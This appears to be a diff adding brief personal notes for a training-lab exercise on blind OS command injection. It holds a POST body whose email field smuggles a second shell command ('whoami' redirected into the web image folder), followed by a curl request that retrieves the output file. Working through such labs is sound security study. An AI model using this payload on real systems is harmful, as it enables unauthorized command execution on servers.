@@ -1,0 +1,13 @@
+
+1. Confirm blind command injection
+- email field
+
+2. Check where images are store
+
+3. Redirect output to file
+
+csrf=06blYTgBkX8wKtDnrDdIDTcwHqQNBkcx&name=test&email=test%40test.com+%26+whoami+>+/var/www/images/.hacked.txt+%23&subject=test&message=test
+
+4. Check if file was created
+
+curl -ik -b $'session=uO7dsSQEj1K4vWPs3YqTedjmWJWuhgOd' 'https://0abd00fb043d2c50819e3e9d00020055.web-security-academy.net/image?filename=.hacked.txt'
